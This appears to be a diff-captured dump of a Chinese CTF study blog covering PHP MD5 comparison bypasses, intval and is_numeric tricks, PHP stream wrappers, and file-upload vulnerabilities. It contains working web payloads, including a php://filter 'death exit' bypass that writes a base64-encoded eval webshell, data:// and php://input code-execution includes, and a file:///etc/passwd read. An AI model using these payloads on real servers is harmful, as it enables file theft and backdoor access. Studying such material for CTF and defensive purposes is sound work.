+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a = $GET[&#x27;a&#x27;];</span><br><span class="line">$b = $_GET[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span><br><span class="line">    // wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>GET传入a和b要求a不等于b，且a和b的md5值相同,md5的绕过</p>
+<ul>
+<li>方法一：利用数组绕过，md5()不能处理数组，传入数组会返回null<br>payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a[]=1&amp;b[]=2</span><br></pre></td></tr></table></figure></li>
+<li>方法二：在php中以“0e”开头的字符串都会以科学计数法来解析，而0的乘积都为0。所以构造md5加密后开头为0e的字符串即可<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br></pre></td></tr></table></figure>
+下面是强比较<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;param1&#x27;]!==$_POST[&#x27;param2&#x27;]&amp;&amp;md5($_POST[&#x27;param1&#x27;])===md5($_POST[&#x27;param2&#x27;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+方法一：数组绕过<br>payload：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=1&amp;param2[]=2</span><br></pre></td></tr></table></figure>
+方法二：使用md5加密后两个完全相等的两个字符串绕过</li>
+<li>md5无论是32位还是16位，都不可能不重复的表示所有信息，这种重复的例子就称为<strong>硬碰撞</strong>，有如下代码：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$s1 = $_GET[&#x27;a&#x27;];</span><br><span class="line">$s2 = $_GET[&#x27;b&#x27;];</span><br><span class="line">$s3 = $_GET[&#x27;c&#x27;];</span><br><span class="line">echo md5($s1),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo md5($s2),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo md5($s3),&quot;&lt;br/&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+payload:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?a=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br><span class="line">&amp;b=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab</span><br><span class="line">&amp;c=%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab</span><br></pre></td></tr></table></figure>
+三个返回相同的md5值<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ea8b4156874b91a4ef00c5ca3e4a4a34</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="双md5碰撞绕过"><a href="#双md5碰撞绕过" class="headerlink" title="双md5碰撞绕过"></a>双md5碰撞绕过</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">md5(md5(CbDLytmyGm2xQyaLNhWn)) =&gt; 0e3a5f2a80db371d4610b8f940d296af</span><br><span class="line">md5(md5(770hQgrBOjrcqftrlaZk)) =&gt; 0e2756da68ef740fd8f5a5c26cc45064</span><br><span class="line">md5(md5(7r4lGXCH2Ksu2JNT3BYM)) =&gt; 0e48d320b2a97ab295f5c4694759889f</span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>
+<h3 id="md5碰撞脚本"><a href="#md5碰撞脚本" class="headerlink" title="md5碰撞脚本"></a>md5碰撞脚本</h3><h3 id="intval-函数"><a href="#intval-函数" class="headerlink" title="intval() 函数"></a>intval() 函数</h3><ul>
+<li>intval() 函数用于获取变量的整数值</li>
+<li>通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值，intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1</li>
+<li>语法：<code>int intval ( mixed $var [, int $base = 10 ] )</code><br>如果 base 是 0，通过检测 var 的格式来决定使用的进制：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)</span><br><span class="line">如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)</span><br><span class="line">否则将使用 10 进制 (decimal)</span><br></pre></td></tr></table></figure>
+绕过方法：通过使用0x或者0开始的格式来绕过不相等的判断（像一些要先判断不相等再判断相等的题目）</li>
+</ul>
+<h2 id="极客大挑战-2019-BuyFlag-1"><a href="#极客大挑战-2019-BuyFlag-1" class="headerlink" title="[极客大挑战 2019]BuyFlag 1"></a>[极客大挑战 2019]BuyFlag 1</h2><ul>
+<li><p>is_numeric() 函数用于检测变量是否为数字<br>利用：is_numeric函数对于空字符%00，无论是%00放在前后都可以判断为非数值</p>
+</li>
+<li><p>bp修改请求方式<br>右键，change request method</p>
+</li>
+</ul>
+<p>{<br>  “registry-mirrors”: [“<a target="_blank" rel="noopener" href="https://qlmy5iw9.mirror.aliyuncs.com"]">https://qlmy5iw9.mirror.aliyuncs.com&quot;]</a><br>}</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/php%E4%BC%AA%E5%8D%8F%E8%AE%AE.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/php%E4%BC%AA%E5%8D%8F%E8%AE%AE.html" itemprop="url">php伪协议</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-16T08:09:22+08:00">
+                2023-04-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>PHP伪协议:是php支持的协议和封装协议。<br>协议:是通信双方的约定<br>封装协议:是在实际的数据通信系统中通过对协议的不同的加密方式，实现双方连接</p>
+<h1 id="php支持的伪协议"><a href="#php支持的伪协议" class="headerlink" title="php支持的伪协议"></a>php支持的伪协议</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 file:// — 访问本地文件系统</span><br><span class="line">2 http:// — 访问 HTTP(s) 网址</span><br><span class="line">3 ftp:// — 访问 FTP(s) URLs</span><br><span class="line">4 php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">5 zlib:// — 压缩流</span><br><span class="line">6 data:// — 数据（RFC 2397）</span><br><span class="line">7 glob:// — 查找匹配的文件路径模式</span><br><span class="line">8 phar:// — PHP 归档</span><br><span class="line">9 ssh2:// — Secure Shell 2</span><br><span class="line">10 rar:// — RAR</span><br><span class="line">11 ogg:// — 音频流</span><br><span class="line">12 expect:// — 处理交互式的流</span><br></pre></td></tr></table></figure>
+<h1 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h1><p>allow_url_fopen off&#x2F;on<br>allow_url_include off&#x2F;on<br>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。<br>协议参数:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">resource=&lt;要过滤的数据流&gt;	这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;	    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;	该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;	任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure>
+<h2 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure>
+<p>使用的convert.base64-encode，就是一种过滤器<br>具体一些过滤器请参照本文参考文章：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120695429">https://blog.csdn.net/cosmoslin/article/details/120695429</a></p>
+<h2 id="死亡exit"><a href="#死亡exit" class="headerlink" title="死亡exit"></a>死亡exit</h2><p>死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);</span><br><span class="line">或者</span><br><span class="line">file_put_contents($content, &#x27;&lt;?php exit();?&gt;&#x27; . $content);</span><br><span class="line">PHP file_put_contents() 函数：语法int file_put_contents ( string $filename , mixed $data [, int $flags = 0 [, resource $context ]] )</span><br><span class="line">参数：filename 	必需，规定要写入数据的文件。如果文件不存在，则创建一个新文件</span><br><span class="line">      data 	必需，规定要写入文件的数据。可以是字符串、数组或数据流。</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>,<span class="string">&quot;&lt;?php exit();&quot;</span>.<span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
+<p>$content在开头增加了exit过程，导致即使我们成功写入一句话，也执行不了。那么这种情况下，如何绕过这个“死亡exit”？</p>
+<p>思路其实也很简单我们只要将content前面的那部分内容使用某种手段（编码等）进行处理，导致php不能识别该部分就可以了。<br>这里的<code>$_POST[‘filename’]</code>是可以控制协议的.<br>这里就介绍一种绕过，即我们刚学的php:&#x2F;&#x2F;filter配合base64编码：</p>
+<h2 id="base64绕过"><a href="#base64绕过" class="headerlink" title="base64绕过"></a>base64绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">首先我们需要清楚的是base64编码中只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码</span><br><span class="line">那么当$content被加上了&lt;?php exit; ?&gt;以后，我们可以使用php://filter/write=convert.base64-decode来首先对其解码。在解码的过程中，字符&lt; ? ; &gt;空格等一共有7个字符不符合base64编码的字符范围将被忽略，所以最终被解码的字符仅有”phpexit”和我们传入的其他字符。</span><br><span class="line">由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，这个时候后面再加上编码后的一句话木马，就可以getshell了。</span><br><span class="line">payload:</span><br><span class="line">?filename=php://filter/convert.base64-decode/resource=xxx.php&amp;content=aPD9waHAgZXZhbCgkX1BPU1RbYV0pOw==</span><br><span class="line">a后面的编码实际上就是一句话木马</span><br><span class="line">死亡exit具体参考：https://blog.csdn.net/woshilnp/article/details/117266628</span><br></pre></td></tr></table></figure>
+<p>这里有个疑问，为什么exit那段代码解码后会改变，而我们传入的编码后的一句话解码后为正常php代码</p>
+<h1 id="data-x2F-x2F"><a href="#data-x2F-x2F" class="headerlink" title="data:&#x2F;&#x2F;"></a>data:&#x2F;&#x2F;</h1><p>allow_url_fopen on<br>allow_url_include on<br>数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。<br>示例用法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、data://text/plain,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line"> </span><br><span class="line">2、data://text/plain;base64,</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAlMjBwaHBpbmZvKCk7Pz4=</span><br></pre></td></tr></table></figure>
+<p><strong>范例</strong><br>#1 打印 data:&#x2F;&#x2F; 的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 打印 &quot;I love PHP&quot;</span><br><span class="line">echo  file_get_contents ( &#x27;data://text/plain;base64,SSBsb3ZlIFBIUAo=&#x27; );</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h1><p>allow_url_fopen off&#x2F;on<br>allow_url_include off&#x2F;on<br>用于访问本地文件系统<br>file:&#x2F;&#x2F;协议主要用于访问文件(绝对路径、相对路径以及网络路径)<br>比如：<code>http://www.xx.com?file=file:///etc/passsword</code></p>
+<h1 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h1><p>allow_url_fopen off&#x2F;on<br>allow_url_include on<br>php:&#x2F;&#x2F;input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">eg：</span><br><span class="line">http://127.0.0.1/cmd.php?cmd=php://input</span><br><span class="line">POST数据：&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure>
+<p>PHP file_get_contents() 函数：把整个文件读入一个字符串中</p>
+<h2 id="注意：碰到file-get-contents-就要想到用php-x2F-x2F-input绕过"><a href="#注意：碰到file-get-contents-就要想到用php-x2F-x2F-input绕过" class="headerlink" title="注意：碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过"></a>注意：碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过</h2><p>碰到file_get_contents()就要想到用php:&#x2F;&#x2F;input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。file_get_contents()：这个函数就是把一个文件里面的东西 （字符）全部return出来作为字符串。除此之外，通过实践我发现这个函数如果直接把字符串当作参数会报错，但如果包含的是http协议的网址，则会像curl命令一样，把源码读出来。而php伪协议也是识别http协议的，所以说上面php:&#x2F;&#x2F;input可以将POST的数据读过来来赋值给参数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo file_get_contents(&quot;php://input&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>php:&#x2F;&#x2F;input（写入木马）:<br>这里有些不理解<br>学习网址：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_51524329/article/details/121439731">https://blog.csdn.net/qq_51524329/article/details/121439731</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F.html" itemprop="url">正则表达式</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-13T19:25:05+08:00">
+                2023-04-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/upload.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yzklov">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/upload.html" itemprop="url">upload</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2023-04-13T19:20:15+08:00">
+                2023-04-13
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="什么是文件上传漏洞"><a href="#什么是文件上传漏洞" class="headerlink" title="什么是文件上传漏洞"></a>什么是文件上传漏洞</h2><p>文件上传漏洞是指文件上传功能没有对上传的文件做合理严谨的过滤，导致用户可以利用此功能，上传能被服务端解析执行的文件，并通过此文件获得执行服务端命令的能力。</p>
+<h2 id="WebShell是什么"><a href="#WebShell是什么" class="headerlink" title="WebShell是什么"></a>WebShell是什么</h2><ul>
+<li>WebShell , 简称网页后门。简单来说它是运行在Web应用之上的远程控制程序</li>
+<li>webShell其实就是一张网页，但webShell并不具备常见网页的功能，例如登录、注册、信息展示等功能，一般会具备文件管理、端口扫描、提权、获取系统信息等功能。</li>
+</ul>
